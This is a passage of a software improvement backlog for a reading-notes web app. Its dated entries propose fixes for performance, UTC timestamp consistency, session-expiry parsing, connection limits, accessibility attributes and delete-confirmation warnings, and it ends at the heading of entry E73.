**Why it matters:** Trace data is observability metadata — it does not need to be durably committed after every event, only at request completion. Batching all trace writes into a single commit at the end of each handler's lifecycle reduces WAL write amplification ~8× and decreases lock contention between concurrent requests on `agent_trace_events`. The change is safe: if the request fails mid-way, the whole trace batch is lost, which is acceptable for observability data (vs. user state where durability matters). The streaming handler already has a `finally` block (around line 4688) that closes the connection — adding `trace_manager.flush(conn)` there (before `conn.close()`) captures all deferred writes.

**Complexity:** M — add `flush(conn)` method to `TraceManager` that calls `conn.commit()` once; set `auto_commit=False` parameter on the three methods (defaulting to current behavior for backward compat); add `trace_manager.flush(conn)` to the streaming handler's `finally` block (~line 4688) and the non-streaming handler's `finally` block (~line 5085). Touch: `app_server.py:2665-2706` (TraceManager class), `app_server.py:4688, 5085` (handler finally blocks).

**Files:** `app_server.py:2665-2706` (TraceManager); `app_server.py:4688` (streaming handler finally); `app_server.py:5085` (non-streaming handler finally)

---

### E54 — MCP dispatcher spawns a full asyncio.run() per tool call — adds 50-150ms overhead per agent action (M)

**What:** `MCPToolDispatcher.dispatch()` in `mcp_dispatcher.py` opens a new asyncio event loop, TCP-connects to the MCP server on port 8788, performs the MCP initialize handshake, calls the tool, then closes the connection — for every single invocation. The file's own docstring acknowledges: "实测 ~50-150ms" per call. Every `POST /api/agent/actions/{id}/execute` triggers one dispatch. A user approving 5 agent actions in sequence accumulates 250-750ms of extra latency from asyncio setup/teardown alone, even before the tool logic runs.

**Why it matters:** The MCP server runs on the same host (port 8788 = localhost). A persistent connection would reduce per-call overhead from ~100ms to <10ms. The fastest approach: a module-level singleton that creates one asyncio event loop in a background thread and routes all dispatch calls through it via `asyncio.run_coroutine_threadsafe()`, reusing the same MCP session across calls. This is a ~30 line change to `mcp_dispatcher.py` and eliminates the dominant latency source for action execution.

**Complexity:** M — create a `_MCPSession` singleton with a background event loop thread; replace the per-call `asyncio.run()` with `asyncio.run_coroutine_threadsafe(_call_tool(...), _loop).result(timeout=30)`. Handle reconnect on connection error. Touch: `mcp_dispatcher.py` (full dispatch refactor, ~60 lines); `app_server.py:28` (import unchanged).

**Files:** `mcp_dispatcher.py` (full dispatch pattern); `tests/agent/` (add a test that dispatches two consecutive calls and asserts the second is faster, or mock the MCP client).

---

### E55 — `renderQuotes()` renders all N quotes synchronously with no display cap, unlike `renderTimeline()`'s slice(0,10) (M)

**What:** `renderTimeline()` at `app.js:1289` caps the no-search view to `allSorted.slice(0, 10)`. `renderQuotes()` at `app.js:1385` renders ALL matching quotes via `quotes.map(...)` with no cap. For a user with 300 quotes, every `renderQuotes()` call — on state change, dialog close, OCR completion, tag filter change — synchronously builds 300 quote-card DOM nodes and assigns them in one `innerHTML` operation. On a mid-tier Android phone this blocks the main thread for ~30-50ms. E5 proposes debouncing the search-input trigger, which reduces call frequency; it does not reduce the per-call DOM cost. After the 200ms debounce fires, the render still processes all 300 cards.

**Why it matters:** A "first 50 + load more" pattern consistent with `renderTimeline()`'s existing behaviour caps every `renderQuotes()` to ≤50 DOM operations regardless of collection size. For the common case (user not searching, opening the quotes tab), this turns a 30ms blocking render into a 5ms one. An `IntersectionObserver` sentinel at the bottom of the list can load the next batch automatically for a seamless scroll experience on mobile.

**Complexity:** M — add `const QUOTES_PAGE_SIZE = 50` constant; in `renderQuotes()`, render `quotes.slice(0, renderedCount)` and append a "显示更多 (N 条)" button (or an invisible sentinel div for IntersectionObserver) if `quotes.length > renderedCount`; track `renderedCount` per filter state. Touch: `app.js:1353-1420` (`renderQuotes`), `styles.css` (load-more button style), no backend changes.

**Files:** `app.js:1353-1420` (`renderQuotes`); `styles.css` (minor button style); `tests/frontend/` (new test for pagination behavior)

---

### E56 — `TraceManager` timestamps use `now_iso()` (naïve local time) — inconsistent with project UTC policy (S)

**What:** `TraceManager.create_trace()` uses `now_iso()` at line 2676 for `created_at`/`updated_at`. `TraceManager.log_event()` uses `now_iso()` at line 2695. `TraceManager.update_trace()` uses `now_iso()` at line 2702. All three produce naïve local-time strings (e.g. `2026-06-08T21:00:00` on a UTC+8 server) while the rest of the codebase has migrated user-visible timestamps to `utc_now_iso()` (OPT-014, OPT-024, OPT-031). E44 already flags `save_state()`'s `updated_at`; TraceManager is a separate class that was missed in those fixes.

**Why it matters:** Trace timestamps appear in the `/debug/agent-dashboard` page (admin-visible) and in `get_trace()` detail responses. Any future analytics that joins `agent_traces.created_at` against `user_state.updated_at` (e.g., to correlate state version with the triggering chat request) would show a spurious +8h skew on a UTC+8 server. Applying the UTC policy consistently closes the door on an entire class of future timezone bugs. The fix is three one-character changes.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:2676, 2695, 2702`. No schema changes, no test changes (trace tests don't assert timestamp format). Touch: `app_server.py:2676, 2695, 2702`.

**Files:** `app_server.py:2676` (`create_trace`), `app_server.py:2695` (`log_event`), `app_server.py:2702` (`update_trace`)

---

## 2026-06-09

### E57 — `#chatInput` textarea has no `maxlength="2000"` — user hits 2000-char backend rejection without any client-side feedback (S)

**What:** `index.html:198` has `<textarea id="chatInput" rows="1" placeholder="输入你的问题或想法…">` with no `maxlength` attribute. The backend's `AgentRequestValidator.validate_chat_request()` rejects messages longer than 2000 characters with a generic error (`app_server.py:2240-2241`). E30 (from 2026-06-04) proposed adding `maxlength` to 7 dialog form inputs (`index.html:379, 380, 402, 426, 459, 470, 607`) but the chat textarea at line 198 is explicitly absent from that list and is on a completely different code path (streaming chat handler, not a form dialog). When a user pastes a long quote or types a multi-paragraph question, they discover the limit only after hitting "发送" — the 2000-char cap is nowhere visible in the UI before submission.

**Why it matters:** The chat input is the highest-frequency interaction surface in the app. An invisible hard limit that produces a post-submit error erodes trust and causes the user to lose their typed message if the input clears. Adding `maxlength="2000"` gives the browser native enforcement (keyboard input stops at the cap) and a native character counter (`<span>` via JS) can show remaining chars when the user approaches 1800+. This is a 1-attribute + ~5-line JS change.

**Complexity:** S — add `maxlength="2000"` to `index.html:198`; optionally wire a live character-counter `<span id="chatInputCounter">` that updates on `input` event in `chat.js` (lines 875–900). No backend changes.

**Files:** `index.html:198`; `chat.js:875-900` (input event handler, optional counter)

---

### E58 — `model_logs.created_at` uses `now_iso()` (naïve local time) — last observability timestamp not aligned with project UTC policy (S)

**What:** `log_model_call()` at `app_server.py:2008` uses `now_iso()` for the `created_at` column of the `model_logs` table. E56 (from 2026-06-08) identified `TraceManager.create_trace()` / `log_event()` / `update_trace()` (lines 2676, 2695, 2702) as the same gap, but `model_logs` is a separate function (`log_model_call`) in the same file that was not covered. The chain of UTC fixes so far: OPT-014 (OCR quote createdAt), OPT-024 (ActionExecutor state JSON), OPT-031 (MCP server), E56/TraceManager (triaged but not yet in backlog). `model_logs.created_at` is the fourth remaining naive-time site in the observability pipeline.

**Why it matters:** The admin debug dashboard at `/debug/logs` orders rows by `model_logs.created_at DESC`. On a single UTC+8 server this is self-consistent (all rows are naive UTC+8), but if the server timezone changes (Docker container rebuild, cloud region migration) the timestamps become incomparable with each other and with future rows written after the change. The `/api/account/export` also includes `modelLogs` with these naive timestamps. Fixing to `utc_now_iso()` at line 2008 costs one identifier substitution and eliminates the last naive timestamp in the LLM call pipeline.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:2008`. No schema changes, no test changes. Touch: `app_server.py:2008`.

**Files:** `app_server.py:1992-2017` (`log_model_call`)

---

### E59 — `buildRenderCache()` builds metrics/quote/connection Maps but omits `bookById` — `renderQuotes()` search path calls O(n) `Array.find()` per quote (S)

**What:** `buildRenderCache()` at `app.js:617-638` pre-computes four Maps (`metricsMap`, `quoteCountMap`, `connCountMap`, `firstQuoteImageMap`) for `renderBooks()`. However, it does not build a `bookById: new Map(state.books.map(b => [b.id, b]))` lookup. `renderQuotes()` at `app.js:1367` performs `state.books.find(b => b.id === item.bookId)` inside the search-filter callback — for each of N quotes, this is O(books). With 300 quotes × 200 books during a search, that's 60,000 comparisons on every keystroke (before the debounce from E5/E14 even fires). `renderTimeline()` at line 1285 has the same pattern during search. `renderConnections()` search filter at lines 735-737 also calls both `state.books.find()` and `state.quotes.find()` per connection.

**Why it matters:** The search path is the performance-critical path: it fires on every debounced keystroke and every call to `render()` while a search is active. Precomputing `bookById` and `quoteById` Maps once (O(n+m) total, amortised over all per-item lookups) converts every inner-loop `.find()` from O(n) to O(1). For the common case of a 200-book / 500-quote user this turns a 100,000-comparison search render into a ~700-comparison one. The cache is already passed to `buildBookSearchCard()` so the wiring pattern is established.

**Complexity:** S — add `bookById: new Map(state.books.map(b => [b.id, b]))` and `quoteById: new Map(state.quotes.map(q => [q.id, q]))` to `buildRenderCache()` return value (`app.js:638`); update `renderQuotes()` and `renderTimeline()` to call `buildRenderCache()` and use `cache.bookById.get(id)` instead of `state.books.find()`. Touch: `app.js:617-638, 1282-1290, 1360-1380`.

**Files:** `app.js:617-638` (`buildRenderCache`); `app.js:1285, 1312` (`renderTimeline` loops); `app.js:1367` (`renderQuotes` search filter); `app.js:735` (`renderConnections` search filter)

---

### E60 — `ActionStateMachine.create_action()` and `transition()` use `now_iso()` for `agent_actions` table timestamps — same naïve-time gap as E56/E58 (S)

**What:** `ActionStateMachine.create_action()` at `app_server.py:2943` assigns `now = now_iso()` for the `created_at` and `updated_at` columns of the `agent_actions` table. `ActionStateMachine.transition()` at `app_server.py:2981` likewise uses `now = now_iso()` for `updated_at`, `approved_at`, and `executed_at`. OPT-024 fixed `ActionExecutor.execute_action()` — the seven calls that write user-visible `createdAt`/`updatedAt` into the **state JSON blob**. But `ActionStateMachine`, which writes the **admin-facing audit columns** of the `agent_actions` SQL table, was not part of that fix. E56 covered `TraceManager` (writing `agent_traces` + `agent_trace_events`); E58 covers `model_logs`. `agent_actions` is the third remaining table in the observability pipeline still using naive time.

**Why it matters:** The `/api/account/export` response includes all `agent_actions` rows with their timestamps (line 3748). The `/debug/agent-dashboard` page renders action data with these timestamps. Users running cross-server analytics (e.g., comparing export timestamps against `user_state.updated_at` which now uses UTC) will see a spurious +8 h skew on UTC+8 servers. The fix is identical in pattern to E56/E58: substitute `utc_now_iso()` for `now_iso()` in two functions.

**Complexity:** S — in `ActionStateMachine.create_action()` (`app_server.py:2943`) and `transition()` (`app_server.py:2981`) replace `now = now_iso()` with `now = utc_now_iso()`. Total: 2 line changes, no schema changes, no test changes. Touch: `app_server.py:2943, 2981`.

**Files:** `app_server.py:2940-2997` (`ActionStateMachine.create_action` and `transition`)

---

## 2026-06-10

### E61 — `compareBooksForList()` secondary sort still uses `localeCompare` — `renderQuotes()` was defensively fixed by OPT-014 but `renderBooks()` was not (S)

**What:** `compareBooksForList()` at `app.js:1026` sorts books within the same status bucket via `(b.createdAt || "").localeCompare(a.createdAt || "")`. OPT-014 identified this exact string-comparison pattern as bug-prone for timestamps and defensively updated `renderQuotes()` (line 1376) to use `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)`. But `compareBooksForList()` was not updated — it is still using lexicographic string comparison. Additionally, `app.js:2431` uses the same `localeCompare` pattern to find the most-recently-updated book in the agent action context picker. With all timestamps now in UTC+Z format (OPT-024/031), `localeCompare` happens to produce correct results *most of the time*, but fails when one timestamp has milliseconds ("...000Z") and another does not ("...Z"): `"2026-06-10T14:00:00Z".localeCompare("2026-06-10T14:00:00.000Z")` returns positive (wrong) because `"Z"` (ASCII 90) sorts after `"."` (ASCII 46), placing the non-millisecond timestamp incorrectly above the millisecond one at the same second.

**Why it matters:** OPT-014's comment in the fix summary explicitly states "frontend sort改为解析后比较 epoch: `new Date(b.createdAt) - new Date(a.createdAt)`，作为防御性加固" — the intent was to fix all sort sites. `compareBooksForList()` is the primary sort for the `#books` tab (every render call). Agent-created books (UTC, no milliseconds) added in the same second as user-created books (UTC, with milliseconds) can appear in the wrong order. The fix is two 1-line changes.

**Complexity:** S — in `compareBooksForList()` (`app.js:1026`) replace `(b.createdAt || "").localeCompare(a.createdAt || "")` with `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)` (note reversed: descending = b - a). Similarly fix line 2431. Touch: `app.js:1026, 2431`.

**Files:** `app.js:1023-1028` (`compareBooksForList`); `app.js:2431` (most-recently-active book finder)

---

### E62 — No `robots.txt` endpoint — search engines can discover and repeatedly crawl `/api/*`, `/debug/*`, `/media/*` (S)

**What:** `app_server.py`'s `do_GET()` handler has no route for `/robots.txt`. All routes not matched by `_STATIC` or explicit path checks fall through to a 404. When search engine crawlers discover the app (via a link, a shared URL, or browser history), they will attempt to index `/api/login`, `/api/register`, `/debug/logs`, `/debug/errors`, and `/media/<uuid>/<file>`. Each such request hits the backend, triggers authentication checks or 404 processing, and leaves server-error entries in the log. For the `/api/*` endpoints this causes spurious 401 entries; for `/debug/*` it may trigger HTML rendering under admin accounts; for `/media/*` it can create unwanted cache entries in CDN/proxy layers.

**Why it matters:** Adding `robots.txt` is a one-file change that: (a) prevents crawler load on API and debug endpoints; (b) avoids `/media/` URLs from being indexed (even partially) by crawlers that ignore the CORS fix from OPT-023; (c) is expected hygiene for any commercial web app. The app already serves other static files from `_STATIC`; adding a `robots.txt` entry follows the exact same pattern.

**Complexity:** S — create `robots.txt` (~8 lines: `User-agent: *`, `Disallow: /api/`, `Disallow: /debug/`, `Disallow: /media/`, `Allow: /`, `Sitemap: …`); add `"robots.txt": ("text/plain", "robots.txt")` to the `_STATIC` dict in `do_GET()` (`app_server.py:3570-3585`). Touch: new `robots.txt` file; `app_server.py:3570-3585`.

**Files:** new `robots.txt`; `app_server.py:3570-3585` (`_STATIC` handler)

---

### E63 — `today_prefix` in debug dashboard computed with `now_iso()[:10]` — will silently miscount "today's" stats after E58 migrates `model_logs.created_at` to UTC (S)

**What:** `app_server.py:3812` computes `today_prefix = now_iso()[:10]` (a local naive date like `"2026-06-10"`) and then filters logs with `(r["createdAt"] or "").startswith(today_prefix)`. Currently `model_logs.created_at` is also written by `now_iso()` (naive local), so both values share the same timezone and the string-prefix filter works. Once E58 lands and `model_logs.created_at` is migrated to `utc_now_iso()` (UTC, e.g. `"2026-06-10T06:30:00Z"`), records created between UTC midnight and UTC+8 midnight (00:00–08:00 local, i.e. 16:00–00:00 UTC the previous day) will have a UTC date string starting with the previous calendar day — they would be excluded from "today's stats" even though they fall in the current local day. On a busy day with 240 requests, up to 80 of them (the first 8 hours' worth) would silently vanish from the dashboard's aggregate counts.

**Why it matters:** The debug dashboard's "today" token and latency aggregates guide daily operational decisions (cost monitoring, anomaly detection). A silent miscount of up to 33% of the day's traffic is a meaningful flaw. The fix is pre-emptive: change `today_prefix = now_iso()[:10]` to `today_prefix = datetime.now(timezone.utc).strftime("%Y-%m-%d")` (UTC date) so it stays consistent with UTC `createdAt` strings after E58. Alternatively, add an explicit `datetime('now', 'localtime')` SQL filter instead of Python startswith. Touch: `app_server.py:3812`.

**Complexity:** S — 1-line change: `today_prefix = now_iso()[:10]` → `today_prefix = datetime.now(timezone.utc).strftime("%Y-%m-%d")`. `datetime` and `timezone` are already imported. No schema changes, no test changes. Touch: `app_server.py:3812`.

**Files:** `app_server.py:3812-3813` (today_prefix + today_logs filter)

---

### E64 — `ocrUpdatedAt` uses `now_iso()` in `_run_quote_ocr_job()` start paths but `utc_now_iso()` at completion paths — mixed timezone on same field (S)

**What:** `_run_quote_ocr_job()` at `app_server.py:1357` and `1403` sets `quote["ocrUpdatedAt"] = now_iso()` for fast-path and Tesseract OCR intermediate status updates. The downstream completion handlers at lines `4656` and `4695` set `target_quote["ocrUpdatedAt"] = utc_now_iso()`. All four writes target the same `ocrUpdatedAt` field in the state JSON. The frontend uses `ocrUpdatedAt` at `app.js:520` via `const startedAt = Date.parse(quote.ocrUpdatedAt || ...)` to compute elapsed OCR time. `Date.parse` handles both naive-local and UTC-Z strings — but interprets them differently: a naive `"2026-06-10T22:30:00"` is parsed as UTC+8 local, while the UTC completion timestamp `"2026-06-10T14:30:00Z"` is parsed as UTC. On a UTC+8 server, these two parses produce the same epoch, so the elapsed timer displays correctly *on the same server*. However, if both start and end timestamps are present in an export and compared offline (or across servers in different timezones), the inconsistency manifests as phantom 8-hour durations.

**Why it matters:** The same UTC migration pattern was applied to every other OCR-related timestamp. Lines 1357 and 1403 were simply missed. Two one-line replacements complete the cleanup and make the entire OCR pipeline timezone-consistent.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:1357` and `1403`. No schema changes, no test changes. Touch: `app_server.py:1357, 1403`.

**Files:** `app_server.py:1317-1430` (`_run_quote_ocr_job`)

---

### E65 — `users.created_at`, `users.terms_accepted_at`, and initial `user_state.updated_at` still use `now_iso()` — final naive-time gap in the user registration and state-initialisation path (S)

**What:** The user registration handler at `app_server.py:4057-4061` writes three naive-time values: `users.created_at = now_iso()`, `users.terms_accepted_at = now_iso()`, and `user_state.updated_at = now_iso()`. `ensure_user_state()` at line 676 writes a fourth: `user_state.updated_at = now_iso()` (the INSERT-if-missing guard called at the start of every request). After OPT-030 (optimistic locking), `user_state.updated_at` is the version field returned to the client as `stateVersion`. For brand-new users, their very first `stateVersion` is a naive-local timestamp, while every subsequent save via `save_state()` writes `utc_now_iso()`. The first optimistic-lock check works because the naive string is an exact match, but mixing naive and UTC values in the same column is semantically inconsistent with the project's UTC migration policy (OPT-014/024/031/035) and the `save_state()` change already noted in E44.

**Why it matters:** Completing the UTC migration in the registration path is the clean-up step for the entire OPT-014 series. The `users.created_at` column appears in the account export and in session responses; naive timestamps there behave inconsistently relative to all other UTC timestamps in the payload. Five `now_iso()` → `utc_now_iso()` replacements at two specific lines finish the migration.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:4057` (2 calls), `app_server.py:4061` (1 call), and `app_server.py:676` (1 call, `ensure_user_state`). No schema changes, no test changes. Touch: `app_server.py:676, 4057-4061`.

**Files:** `app_server.py:676` (`ensure_user_state`); `app_server.py:4057-4061` (registration handler)

---

## 2026-06-11

### E66 — `_parse_iso_to_epoch()` strips "Z" without setting UTC timezone — will silently miscalculate session and subscription expiry once any UTC+Z value is stored in those columns (S)

**What:** `_parse_iso_to_epoch()` at `app_server.py:1443-1449` is implemented as `datetime.fromisoformat(value.replace("Z", "")).timestamp()`. Stripping the `"Z"` suffix makes `fromisoformat()` produce a **timezone-naive** datetime; `.timestamp()` then converts it using the server's **local** timezone. On a UTC+8 server, the UTC string `"2026-06-11T14:00:00Z"` parses to epoch 1749614400 (14:00 UTC+8 = 06:00 UTC) instead of the correct 1749643200 (14:00 UTC). This function is used to parse `sessions.last_seen_at` (session expiry check, line 1466) and `users.plan_expires_at` (subscription check, line 1499). Currently both columns store naive-local strings (consistent), so the parsing is accidentally self-consistent. However, as the UTC migration series (OPT-014/024/031/035/038/E56/E67) progresses, the first moment either column starts receiving `utc_now_iso()` output, the expiry calculation will be silently wrong by ±TZ_OFFSET hours — sessions expire 8 hours early, Plus subscriptions appear expired while still valid, or vice versa.

**Why it matters:** The fix is a 2-line change and eliminates a landmine that will trigger the moment `sessions.last_seen_at` or `users.plan_expires_at` migrates to UTC. A silent session-expiry regression would log users out unexpectedly; a silent subscription-expiry regression would either lock out paying users or silently extend free access. The correct approach: if value ends with `"Z"`, replace with `"+00:00"` before `fromisoformat()` so the datetime is timezone-aware UTC; otherwise parse as-is.

**Complexity:** S — replace `datetime.fromisoformat(value.replace("Z", "")).timestamp()` with `datetime.fromisoformat(value if not value.endswith("Z") else value[:-1] + "+00:00").timestamp()`. No schema changes, no test changes. Touch: `app_server.py:1447`.

**Files:** `app_server.py:1443-1449` (`_parse_iso_to_epoch`); downstream callers at lines 1466 (`resolve_user_from_token`) and 1499 (`_resolve_user_plan`)

---

### E67 — `payments` table `created_at`/`updated_at` use `now_iso()` (naive local) — billing audit trail is the last un-migrated table in the UTC cleanup series (S)

**What:** The Stripe webhook handler (`app_server.py:1805-1940`) writes `now_iso()` for `payments.created_at` and `payments.updated_at` at lines ~1852, 1890, 1915, and 1935. Additionally, `period_end_iso` at line 1876 is computed via `datetime.fromtimestamp(int(period_end)).isoformat(timespec="seconds")` — converting Stripe's UTC Unix timestamp to **naive local time** before storing in `users.plan_expires_at`. The UTC migration series (OPT-014/024/031/035/038, E56, E58, E60, E63, E64, E65) has now addressed every other table in the observability and user-data pipelines. The `payments` table — a financial audit record that flows into `/api/account/export` — is the sole remaining table still using naive local timestamps.

**Why it matters:** Financial audit records should carry timezone-unambiguous timestamps. If the server migrates between data centres or is rebuilt in a different timezone, historical payment rows become incomparable with new rows. More concretely: the current `period_end_iso` stored in `plan_expires_at` is in naive local time, parsed back by `_parse_iso_to_epoch()` — both are currently self-consistent (same local TZ), but once E66's fix is applied (making `_parse_iso_to_epoch()` correct for UTC strings), this column should also migrate to UTC to remain consistent. Six `now_iso()` → `utc_now_iso()` substitutions and one `datetime.fromtimestamp(period_end)` → `datetime.fromtimestamp(period_end, tz=timezone.utc).strftime(...)` substitution complete the UTC cleanup.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at the 4 `payments` INSERT sites (`app_server.py:~1852, ~1890, ~1915, ~1935`); change line 1876 from `datetime.fromtimestamp(int(period_end)).isoformat(timespec="seconds")` to `datetime.fromtimestamp(int(period_end), tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")`. `timezone` is already imported. Touch: `app_server.py:1876, 1852, 1890, 1915, 1935`.

**Files:** `app_server.py:1850-1940` (Stripe webhook handler); `app_server.py:1876` (`period_end_iso` conversion)

---

### E68 — Session CRUD and Connection CRUD have no frontend JS tests — two of the four main tabs are regression-blind (M)

**What:** `tests/frontend/` contains 13 test files, but none cover the session timeline or connections tabs. The books tab has `book-duplicate.test.js`, `book-list-ordering-fix.test.js`, `book-ocr.test.js`; the quotes tab has `quote-content-display.test.js`, `ocr-stale-recovery.test.js`. The **sessions** tab (`renderTimeline()` at `app.js:1335-1480`, `addSession()`/`editSession()`/`deleteSession()` at `app.js:2290-2340`) and **connections** tab (`renderConnections()` at `app.js:720-760`, `addConnection()`/`editConnection()`/`deleteConnection()` at `app.js:3480-3530`) have zero dedicated test coverage. `renderTimeline()` is ~145 lines of DOM logic with date-grouping, status-filter, and card-link wiring that could silently regress. The connections sub-render is 40 lines with bidirectional label resolution.

**Why it matters:** Sessions are the primary daily-use feature (users log reading time after each session). Connections are the unique "thought-linking" capability that differentiates the app from a simple book tracker. Both have been touched in recent refactors (OPT-027 unified the card menu, adding new event wiring). Yet neither has a single JS test to catch regressions. Adding test files follows the exact same Node vm-sandbox pattern already established in `tests/frontend/ui-redesign.test.js` and `tests/frontend/chat-agent-approval.test.js` — no server needed, no new test framework.

**Complexity:** M — write `tests/frontend/session-crud.test.js` (render with fixture sessions, assert card count, assert delete calls syncState, assert status filter); write `tests/frontend/connection-crud.test.js` (render with fixture connections, assert bidirectional card labels, assert search filter). ~60-80 lines each. Touch: `tests/frontend/` (two new test files); `app.js:1335-1480, 2290-2340, 720-760` (no changes, test against existing code).

**Files:** `app.js:1335-1480` (`renderTimeline`); `app.js:2290-2340` (`deleteSession`); `app.js:720-760` (`renderConnections`); `tests/frontend/` (new test files)

---

### E69 — No per-user limit on concurrent `/api/chat/stream` SSE connections — many open tabs can exhaust the `ThreadingHTTPServer` thread pool (M)

**What:** `ThreadingHTTPServer` spawns one OS thread per connection; active SSE clients hold their thread alive for up to 30 seconds (the idle-abort timeout from E24/OPT). There is no per-user or global cap on concurrent open SSE connections. A user with 10 browser tabs can fire 10 simultaneous streaming chat requests (each passing the per-user rate-limit check since they are distinct requests in rapid succession before any counter increments). Each request blocks a thread waiting on `DeepSeek` streaming response (5–30 s). At 10 tabs × 30 s, that user monopolises ~10 threads for 30 seconds; at the OS default thread-stack size (~2–8 MB), 200 concurrent connections exhaust 400–1600 MB of RAM. The existing `_enforce_rate_limit()` is count-based (requests/hour) and fires at the top of the handler — it does not track in-flight connections.

**Why it matters:** For a small-VPS deployment (2-4 CPU cores, 2-4 GB RAM) with moderate concurrent users, a single abusive session (or a crash-looping client retrying every second) can absorb enough threads to cause `EAGAIN` / `ECONNREFUSED` for all other users. A simple `threading.Semaphore` global counter (`MAX_STREAM_CONNECTIONS = 20`) that each handler acquires before entering the SSE loop and releases in `finally` would cap worst-case thread consumption. The acquire could use `timeout=0` and return 503 immediately if the limit is reached.

**Complexity:** M — add `_stream_semaphore = threading.Semaphore(MAX_STREAM_CONNECTIONS)` constant (default 20, configurable via env); in the `/api/chat/stream` handler (`app_server.py:~4440`), acquire before entering the generator loop and release in `finally`. Add one integration test that fires `MAX_STREAM_CONNECTIONS + 1` concurrent requests and asserts the last gets 503. Touch: `app_server.py:4440-4688` (streaming handler); `tests/agent/` (new concurrency test).

**Files:** `app_server.py:4440-4688` (streaming chat handler); `tests/agent/` (new concurrency test)

---

## 2026-06-12

### E70 — Tab navigation `<nav>` missing `role="tablist"`, `role="tab"`, and `aria-selected` — screen readers announce 6 anonymous buttons (WCAG 4.1.2 Level A) (S)

**What:** `<nav class="mobile-tabs" id="mobileTabs">` at `index.html:679` contains 6 `<button>` elements (`data-tab="books"`, `session`, `quote`, `chat`, `connections`, `me`) that form the app's primary navigation. `activateTab()` at `app.js:1627-1633` switches them by toggling a CSS `active` class on buttons and `tab-active` on panels. No ARIA attributes are set: there is no `role="tablist"` on the nav, no `role="tab"` on the buttons, no `aria-selected` to communicate selected/deselected state, no `aria-controls` linking buttons to their panels, and no `id` on the panel `<section>` elements for that link to target. When a screen reader user focuses the nav, they hear "书单 button, 记录 button, …" — 6 unlabeled buttons with no indication that they form a tab widget or which one is currently active.

**Why it matters:** WCAG 2.1 SC 4.1.2 (Name, Role, Value — Level A) requires interactive components to expose their role and current state to assistive technology. The ARIA tab pattern — `role="tablist"` on the container, `role="tab"` + `aria-selected="true/false"` on each button, `role="tabpanel"` + `aria-labelledby` on each panel — is the standard expected by screen readers for this interaction model. Without it, screen reader users cannot discover which tab is selected, cannot use the standard arrow-key navigation shortcut for tabs, and are effectively locked out of the primary app structure. The fix is ~12 HTML attribute additions and 1 JS line in `activateTab()`.

**Complexity:** S — add `role="tablist"` to `index.html:679`; add `role="tab"` + `aria-selected="true"/"false"` + `aria-controls="<panel-id>"` to each of the 6 `<button>` elements (6×3 attrs); add matching `id` attributes + `role="tabpanel"` + `aria-labelledby` to each `<section data-tab-section>` (6 panels × 3 attrs); in `activateTab()` at `app.js:1629`, add one line to update `button.setAttribute("aria-selected", String(button.dataset.tab === tabName))`. Touch: `index.html:679-704` (nav + buttons), `index.html:72-160` (panel sections), `app.js:1628-1630`.

**Files:** `index.html:679-704` (tab nav); `index.html:72-160` (panel `<section>` elements); `app.js:1627-1633` (`activateTab`)

---

### E71 — `deleteBook` confirmation shows only the book title — cascade count (N quotes, M sessions) not mentioned; users lose data silently (S)

**What:** `deleteBook()` at `app.js:2066-2122` cascades: it removes all quotes, sessions, chat histories, and connections associated with the book. The confirmation dialog at line 2072 sets only `els.deleteBookMessage.textContent = book.title` — showing only the book title. A user with 30 quotes and 15 sessions under the book has no warning they're about to lose 45 records. The dialog text at `index.html:529` says "确定删除这本书吗？" with no mention of what else will be deleted. By contrast, OPT-043 (just shipped) added pre-import cascade warnings for the same class of silent data loss; the same principle applies here.

**Why it matters:** The data loss is irreversible — there is no undo path. The cascade includes quote images stored under `/uploads/<user_id>/` (a GC job would clean orphaned files, but the state data is gone). A user who accidentally confirms a book deletion loses all their quote cards, reading sessions, and annotations for that book with no recovery path (unless they have a recent export). Showing "删除《书名》还将同时删除 N 张摘抄、M 条记录和 K 个关联" takes ~5 lines of JS and directly matches the safety precedent of OPT-043.

**Complexity:** S — in `deleteBook()` at `app.js:2069`, add: `const qCount = state.quotes.filter(q => q.bookId === bookId).length; const sCount = state.sessions.filter(s => s.bookId === bookId).length;`. If either is non-zero, append the cascade summary to the message string before showing the dialog. Touch: `app.js:2069-2073` (4 lines inserted before existing dialog show).

**Files:** `app.js:2066-2073` (`deleteBook`); `index.html:526-537` (`deleteBookDialog` — message line may need to be a full sentence rather than a bare title)

---

### E72 — Login/register forms missing `autocomplete` attributes — password managers fail to auto-fill; WCAG 1.3.5 Level AA (S)

**What:** The login form at `index.html:247-248` has `<input name="username" type="text" ...>` and `<input name="password" type="password" ...>` with no `autocomplete` attribute. The registration form at `index.html:255-257` has the same gap on `username`, `email`, and `password` inputs. The search inputs (`booksSearchInput`, `sessionSearch`, etc.) correctly carry `autocomplete="off"` — the problem is specific to the two auth forms. Without `autocomplete="current-password"` on the login password field, iOS Safari and Chrome on Android don't offer to fill from the keychain (they fall back to URL-based heuristics which often fail for same-domain SPA apps). Without `autocomplete="new-password"` on the registration password field, browsers may auto-complete an old password rather than generate and save a new one.

**Why it matters:** WCAG 2.1 SC 1.3.5 (Identify Input Purpose — Level AA) requires inputs that collect personal data to carry `autocomplete` tokens so assistive technology — including switch control and voice control — can fill them automatically. For a mobile-first Chinese reading app, iOS Face ID / WeChat keychain autofill is a key UX convenience; the absence of `autocomplete` tokens blocks it. The fix is 5 HTML attribute additions with zero JS or backend changes.

**Complexity:** S — add `autocomplete="username"` to `index.html:247` (login username) and `index.html:255` (register username); `autocomplete="current-password"` to `index.html:248` (login password); `autocomplete="email"` to `index.html:256` (register email); `autocomplete="new-password"` to `index.html:257` (register password). Touch: `index.html:247-257`.

**Files:** `index.html:247-257` (login + register form inputs)

---

### E73 — `resolve_user_from_token` writes `last_seen_at = now_iso()` (naive local time) while `gc_expired_sessions` compares a UTC-naive-Z cutoff — sessions survive ~8 extra hours past expiry on UTC+8 servers (S)

